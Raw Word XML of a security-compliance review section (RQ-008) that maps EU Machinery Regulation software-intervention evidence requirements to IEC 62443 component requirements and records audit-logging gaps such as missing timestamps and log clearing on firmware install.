    <w:p w14:paraId="5E6573DE" w14:textId="77777777" w:rsidR="009B0AAA" w:rsidRDefault="009B0AAA" w:rsidP="003165C7">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="25A329E9" w14:textId="77777777" w:rsidR="009B0AAA" w:rsidRDefault="009B0AAA" w:rsidP="003165C7">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="278AFE6B" w14:textId="77777777" w:rsidR="009B0AAA" w:rsidRDefault="009B0AAA" w:rsidP="003165C7">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64AF5B47" w14:textId="77777777" w:rsidR="009B0AAA" w:rsidRDefault="009B0AAA" w:rsidP="003165C7">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A6919E2" w14:textId="77777777" w:rsidR="009B0AAA" w:rsidRDefault="009B0AAA" w:rsidP="003165C7">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05997D51" w14:textId="77777777" w:rsidR="008E6DD6" w:rsidRDefault="008E6DD6" w:rsidP="003165C7">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A91EBF1" w14:textId="77777777" w:rsidR="008E6DD6" w:rsidRDefault="008E6DD6" w:rsidP="003165C7">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27254B1D" w14:textId="77777777" w:rsidR="008E6DD6" w:rsidRDefault="008E6DD6" w:rsidP="003165C7">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="340EE858" w14:textId="77777777" w:rsidR="008E6DD6" w:rsidRDefault="008E6DD6" w:rsidP="003165C7">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B2F75A5" w14:textId="77777777" w:rsidR="008E6DD6" w:rsidRDefault="008E6DD6" w:rsidP="003165C7">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F19667E" w14:textId="77777777" w:rsidR="00015538" w:rsidRDefault="00015538" w:rsidP="003165C7">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="110579B3" w14:textId="77777777" w:rsidR="00015538" w:rsidRDefault="00015538" w:rsidP="003165C7">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08C989F5" w14:textId="77777777" w:rsidR="00015538" w:rsidRDefault="00015538" w:rsidP="003165C7">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37F70174" w14:textId="77777777" w:rsidR="00015538" w:rsidRDefault="00015538" w:rsidP="003165C7">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7BDF1AE6" w14:textId="77777777" w:rsidR="00015538" w:rsidRDefault="00015538" w:rsidP="003165C7">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="635BC139" w14:textId="77777777" w:rsidR="00015538" w:rsidRDefault="00015538" w:rsidP="003165C7">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="694402F2" w14:textId="77777777" w:rsidR="008E6DD6" w:rsidRDefault="008E6DD6" w:rsidP="003165C7">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="23483518" w14:textId="77777777" w:rsidR="008E6DD6" w:rsidRDefault="008E6DD6" w:rsidP="003165C7">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A691FE4" w14:textId="3A14CDB8" w:rsidR="008E6DD6" w:rsidRPr="00C1714F" w:rsidRDefault="008E6DD6" w:rsidP="008E6DD6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lastRenderedPageBreak/>
        <w:t xml:space="preserve">REQUIREMENT </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:u w:val="double"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B147212" w14:textId="77777777" w:rsidR="008E6DD6" w:rsidRPr="003165C7" w:rsidRDefault="008E6DD6" w:rsidP="003165C7">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B02DADA" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0002207B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-008 — Reprocessed (Scope-Corrected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="579299D0" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0002207B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Correction applied:</w:t>
      </w:r>
      <w:r w:rsidRPr="0002207B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Rechecking RQ-008 against the boundary discipline, I found the </w:t>
      </w:r>
      <w:r w:rsidRPr="0002207B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>same config-vs-software leak that I corrected in RQ-004</w:t>
      </w:r>
      <w:r w:rsidRPr="0002207B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, this time crossing into </w:t>
      </w:r>
      <w:r w:rsidRPr="0002207B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-009</w:t>
      </w:r>
      <w:r w:rsidRPr="0002207B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E239861" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="002046B2" w:rsidRDefault="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0002207B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Config-modification markers imported (scope creep → RQ-009).</w:t>
      </w:r>
      <w:r w:rsidRPr="0002207B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">My original RQ-008 listed the </w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>I&amp;M0 REVISION_COUNTER</w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and the </w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>I&amp;M4 signature</w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> as evidence mechanisms. Both are </w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>configuration-modification</w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> markers — REVISION_COUNTER increments on </w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>parameter</w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> change; I&amp;M4 fingerprints the </w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>parameter set</w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Modification of software </w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>or its configuration</w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is RQ-009.</w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-008 is scoped to </w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">intervention in the installed </w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>software</w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (firmware)</w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>. You yourself flagged this in your submission ("</w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>REVISION_COUNTER … primarily relevant to configuration modification, RQ-009</w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">") — I am now acting on that flag and </w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>removing both from RQ-008</w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, keeping only </w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>software/firmware</w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-intervention evidence.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26999695" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="002046B2" w:rsidRDefault="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-2 framing tightened.</w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The "legitimate-vs-illegitimate indistinguishability" point is valid for RQ-008, but its </w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cause</w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (no firmware-signature verification) is </w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-005's finding</w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. I re-frame G-2 as an </w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>evidence-classification</w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> failure and </w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cross-reference RQ-005</w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> for the underlying protection gap — without re-testing the protection here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D32A7B2" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="002046B2" w:rsidRDefault="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-3 (self-erasing install) retained but bounded.</w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The install-reboot clearing is RQ-008's most decisive finding (the software-intervention's </w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>own</w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> record is destroyed at collection time); the </w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>5-year retention</w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> dimension of that same mechanism is </w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-012</w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — cross-referenced.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B584223" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="002046B2" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The audit-family CR mapping (CR 2.8/2.9/2.10/2.11/2.12/3.9/6.1 + EDR 2.13) is correct and stays — consistent with RQ-003.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13EE16E7" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="0002207B">
        <w:pict w14:anchorId="07E0D8B6">
          <v:rect id="_x0000_i1541" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FF15BC2" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="002046B2" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 1 — Critical Review &amp; Theoretical Validation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5959F206" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="002046B2" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>1.1 Requirement &amp; CR Mapping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AA6B422" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="002046B2" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">EU Machinery Regulation (EU) 2023/1230, Annex III </w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EHSR 1.1.9 §2</w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, scoped to </w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>installed software</w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — an </w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>audit/accountability</w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> requirement. CR 2.8 alone cannot carry it (evidence needs time, capacity, overflow handling, protection).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911"/>
        <w:gridCol w:w="1680"/>
        <w:gridCol w:w="3836"/>
      </w:tblGrid>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="00D650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596208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12930A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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Your</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B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9FC112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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B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BEB297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Note</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="002046B2" w14:paraId="6F23D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807A9" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve">CR 2.8 – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>Auditable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events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ABB4E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08DA2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t>Correct</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>, partial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641B7" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="002046B2" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002046B2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Logs </w:t>
            </w:r>
            <w:r w:rsidRPr="002046B2">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>that</w:t>
            </w:r>
            <w:r w:rsidRPr="002046B2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> a software event occurred, not </w:t>
            </w:r>
            <w:r w:rsidRPr="002046B2">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>whether</w:t>
            </w:r>
            <w:r w:rsidRPr="002046B2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002046B2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>authorised</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002046B2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="002046B2" w14:paraId="0672B9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348D5" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:t>CR 2.12 – Non-repudiation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E033F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F68FF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t>Correct</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>structurally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constrained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BC1B4" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="002046B2" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002046B2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>No user auth on the FW-update/IoT path (SRIO-8299) → no actor.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="002046B2" w14:paraId="347C1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3BD7E6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 xml:space="preserve">CR 2.11 – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Timestamps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68857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➕</w:t>
            </w:r>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve"> (I </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>added</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207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96021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Decisive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98264" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="002046B2" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002046B2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>No RTC; uptime resets on cold start (SRIO-15218/15398).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="2DD7B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93CCB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 xml:space="preserve">CR 2.9 / 2.10 – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Capacity</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> / </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>overflow</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>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DF69C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➕</w:t>
            </w:r>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve"> (I </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>added</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207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AA7B8" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
